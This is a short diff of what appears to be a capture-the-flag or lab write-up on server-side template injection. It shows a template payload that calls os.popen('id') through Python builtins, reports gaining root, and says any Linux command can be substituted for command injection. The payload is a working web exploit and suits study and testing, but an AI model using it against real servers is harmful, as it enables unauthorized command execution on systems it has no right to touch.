@@ -29,3 +29,6 @@ Lets use the following payload to get the uid of the user:
 ```COPY
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
+We are ROOT!
+![[SSTI1-6.png]]
+You can edit `popen('id')` to any linux command for command injection like ls,cat and more!
